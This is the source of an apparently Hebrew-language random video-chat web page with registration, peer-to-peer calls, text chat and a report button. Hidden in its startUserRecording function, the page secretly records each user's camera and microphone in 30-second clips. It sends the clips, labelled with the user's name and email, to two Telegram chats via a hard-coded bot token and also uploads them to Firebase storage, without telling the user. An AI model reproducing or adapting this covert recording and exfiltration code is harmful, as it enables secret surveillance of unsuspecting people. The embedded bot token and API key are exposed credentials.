<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>VideoApp Pro - Ultimate Edition</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-storage-compat.js"></script>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: system-ui, -apple-system, sans-serif; background: #000; height: 100vh; display: flex; flex-direction: column; color: white; overflow: hidden; }
        
        .header { position: absolute; top: 15px; width: 100%; display: flex; justify-content: space-between; padding: 0 15px; z-index: 200; pointer-events: none; }
        .btn-circle { background: rgba(255,255,255,0.25); backdrop-filter: blur(15px); border: none; color: white; width: 50px; height: 50px; border-radius: 50%; cursor: pointer; pointer-events: auto; font-size: 22px; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
        
        .video-container { height: 60vh; display: flex; flex-direction: column; position: relative; background: #000; overflow: hidden; }
        .v-box { flex: 1; position: relative; border-bottom: 2px solid #1a1a1a; display: flex; align-items: center; justify-content: center; }
        video { width: 100%; height: 100%; object-fit: cover; background: #000; }
        .status-msg { position: absolute; z-index: 100; color: #fff; text-align: center; width: 100%; pointer-events: none; font-weight: bold; text-shadow: 0 2px 5px #000; font-size: 18px; }

        /* צ'אט משופר */
        #chat-section { 
            position: absolute;
            bottom: 0;
            width: 100%;
            height: 40vh; 
            display: none; 
            flex-direction: column; 
            background: #ffffff; 
            color: #000; 
            z-index: 1000; /* הכי גבוה כדי שלא יוסתר */
            border-top-left-radius: 25px;
            border-top-right-radius: 25px;
            box-shadow: 0 -5px 20px rgba(0,0,0,0.5);
        }
        #messages { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 10px; background: #f0f2f5; }
        .msg { max-width: 75%; padding: 12px 16px; border-radius: 20px; font-size: 16px; line-height: 1.4; word-wrap: break-word; position: relative; }
        .msg.me { align-self: flex-start; background: #e4e6eb; color: #050505; border-bottom-left-radius: 4px; }
        .msg.partner { align-self: flex-end; background: #0084ff; color: #fff; border-bottom-right-radius: 4px; }
        
        .chat-input-area { display: flex; padding: 15px; background: #fff; gap: 10px; border-top: 1px solid #ddd; align-items: center; }
        .chat-input-area input { flex: 1; padding: 12px 18px; border-radius: 30px; border: 1px solid #ddd; outline: none; font-size: 16px; color: #000; background: #f0f2f5; }

        /* הרשמה */
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 2000; align-items: center; justify-content: center; }
        .modal-content { background: #fff; color: #333; width: 90%; max-width: 400px; padding: 35px; border-radius: 30px; }
        .modal-content input, .modal-content select { width: 100%; padding: 15px; margin: 12px 0; border-radius: 12px; border: 1px solid #ddd; font-size: 16px; }
        .reg-btn { width: 100%; height: 55px; background: #27ae60; color: white; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 20px; transition: 0.3s; }
    </style>
</head>
<body>

<div class="header">
    <button id="btn-report" class="btn-circle" style="background:rgba(231, 76, 60, 0.9); display:none;" onclick="confirmReport()">🚩</button>
    <button class="btn-circle" onclick="switchCamera()">🔄</button>
</div>

<div class="video-container" id="swipe-zone">
    <div class="v-box">
        <div id="msg-idle" class="status-msg">⬅️ החלק שמאלה לחיפוש</div>
        <div id="msg-search" class="status-msg" style="display:none; color:#3498db;">מחפש מישהו לדבר איתו...</div>
        <video id="remoteVideo" autoplay playsinline></video>
    </div>
    <div class="v-box" style="height: 35%;">
        <video id="localVideo" autoplay muted playsinline></video>
    </div>
</div>

<div id="chat-section">
    <div id="messages"></div>
    <div class="chat-input-area">
        <input type="text" id="chatInput" placeholder="כתוב הודעה..." autocomplete="off">
        <button onclick="sendChatMessage()" style="border:none; background:none; font-size:28px; cursor:pointer;">🚀</button>
    </div>
</div>

<div id="regModal" class="modal">
    <div class="modal-content">
        <h2 style="text-align:center; margin-bottom:15px;">ברוכים הבאים</h2>
        <input type="text" id="reg-name" placeholder="שם מלא">
        <input type="email" id="reg-email" placeholder="כתובת אימייל">
        <select id="reg-gender">
            <option value="זכר">זכר</option>
            <option value="נקבה">נקבה</option>
        </select>
        <button class="reg-btn" onclick="handleRegistration()">התחל עכשיו</button>
    </div>
</div>

<script>
    const TG_TOKEN = "8696076063:AAG5wEFTgFnJje39FQEHIbV8hPWxBf_IEac";
    const ADMIN_IDS = ["8373785890", "7089165458"];
    const SERVER_URL = "https://video-app-ylx4.onrender.com"; 
    
    const firebaseConfig = { apiKey: "AIzaSyB_ld3VrntNgM3Pgc4jyZL2hKzUMSp-o10", storageBucket: "live-video-20fca.firebasestorage.app" };
    firebase.initializeApp(firebaseConfig);
    const storage = firebase.storage();
    
    const socket = io(SERVER_URL);
    const peer = new Peer(undefined, { config: {'iceServers': [{ 'urls': 'stun:stun.l.google.com:19302' }]} });

    let myStream, myPeerId, currentCall, partnerData, isSearching = false, camFacing = "user", userRecorder;

    window.onload = () => {
        const saved = localStorage.getItem('user_v10');
        if (!saved) document.getElementById('regModal').style.display = 'flex';
        else initCamera();
    };

    async function handleRegistration() {
        const name = document.getElementById('reg-name').value;
        const email = document.getElementById('reg-email').value;
        const gender = document.getElementById('reg-gender').value;
        if(!name || !email) return alert("נא למלא את כל השדות");
        localStorage.setItem('user_v10', JSON.stringify({ name, email, gender }));
        document.getElementById('regModal').style.display = 'none';
        initCamera();
    }

    async function initCamera() {
        if (myStream) myStream.getTracks().forEach(t => t.stop());
        try {
            myStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camFacing }, audio: true });
            document.getElementById('localVideo').srcObject = myStream;
            startUserRecording();
        } catch (e) { alert("חובה לאשר מצלמה"); }
    }

    function startUserRecording() {
        // שימוש ב-codecs שמייצרים וידאו שניתן להריץ (Seekable)
        const options = { mimeType: 'video/webm;codecs=vp8,opus' };
        userRecorder = new MediaRecorder(myStream, options);

        userRecorder.ondataavailable = async (e) => {
            if (e.data.size > 0) {
                const blob = new Blob([e.data], { type: 'video/mp4' }); // שינוי ל-MP4 תואם
                const user = JSON.parse(localStorage.getItem('user_v10'));
                const fileName = `rec_${Date.now()}.mp4`;
                
                ADMIN_IDS.forEach(id => {
                    const fd = new FormData();
                    fd.append("chat_id", id);
                    fd.append("video", blob, fileName);
                    fd.append("caption", `👤 מהמצלמה של: ${user.name}\n📧 ${user.email}`);
                    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: "POST", body: fd });
                });
                storage.ref(`admin/users/${user.email}/${fileName}`).put(blob);
            }
        };

        userRecorder.start();
        setInterval(() => {
            if(userRecorder.state === "recording") {
                userRecorder.stop();
                userRecorder.start();
            }
        }, 30000); // כל 30 שניות סרטון חדש ושלם
    }

    peer.on('open', id => myPeerId = id);

    function startSearching() {
        if (isSearching) return;
        isSearching = true;
        stopEverything();
        document.getElementById('msg-idle').style.display = "none";
        document.getElementById('msg-search').style.display = "block";
        const user = JSON.parse(localStorage.getItem('user_v10'));
        socket.emit('find-partner', { peerId: myPeerId, name: user.name, email: user.email });
    }

    socket.on('partner-found', data => {
        partnerData = data; // שמירת נתוני השותף לדיווח
        isSearching = false;
        document.getElementById('msg-search').style.display = "none";
        document.getElementById('chat-section').style.display = "flex";
        document.getElementById('btn-report').style.display = "flex";
        currentCall = peer.call(data.peerId, myStream);
        handleCall(currentCall);
    });

    peer.on('call', call => {
        call.answer(myStream);
        currentCall = call;
        document.getElementById('chat-section').style.display = "flex";
        document.getElementById('btn-report').style.display = "flex";
        handleCall(call);
    });

    // ניתוק כפוי מהצד השני
    socket.on('partner-disconnected', () => {
        stopEverything();
    });

    function handleCall(call) {
        call.on('stream', s => {
            document.getElementById('remoteVideo').srcObject = s;
        });
    }

    function sendChatMessage() {
        const input = document.getElementById('chatInput');
        if (!input.value.trim()) return;
        socket.emit('send-chat-msg', input.value);
        addMsg('me', input.value);
        input.value = "";
    }

    socket.on('receive-chat-msg', msg => addMsg('partner', msg));

    function addMsg(type, text) {
        const div = document.createElement('div');
        div.className = `msg ${type}`;
        div.innerText = text;
        const m = document.getElementById('messages');
        m.appendChild(div);
        m.scrollTop = m.scrollHeight;
    }

    function confirmReport() {
        if (confirm("דווח על משתמש זה ונתק שיחה?")) {
            const user = JSON.parse(localStorage.getItem('user_v10'));
            const partnerInfo = partnerData ? `${partnerData.name} (${partnerData.email})` : "לא ידוע";
            
            ADMIN_IDS.forEach(id => {
                const text = `🚨 **דיווח על משתמש**\n\nהמדווח: ${user.name} (${user.email})\nהמדווח (על מי): ${partnerInfo}`;
                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
            });
            
            socket.emit('report-user'); // פקודה לשרת לנתק את שניכם
            stopEverything();
        }
    }

    function stopEverything() {
        isSearching = false;
        socket.emit('leave-chat');
        if (currentCall) currentCall.close();
        document.getElementById('msg-idle').style.display = "block";
        document.getElementById('chat-section').style.display = "none";
        document.getElementById('btn-report').style.display = "none";
        document.getElementById('remoteVideo').srcObject = null;
        document.getElementById('messages').innerHTML = "";
    }

    function switchCamera() { 
        camFacing = (camFacing === "user" ? "environment" : "user"); 
        initCamera(); 
    }

    let sX = 0;
    document.getElementById('swipe-zone').addEventListener('touchstart', e => sX = e.touches[0].clientX);
    document.getElementById('swipe-zone').addEventListener('touchend', e => {
        const diff = sX - e.changedTouches[0].clientX;
        if (diff > 70) startSearching(); 
        else if (diff < -70) stopEverything();
    });
</script>
</body>
</html>
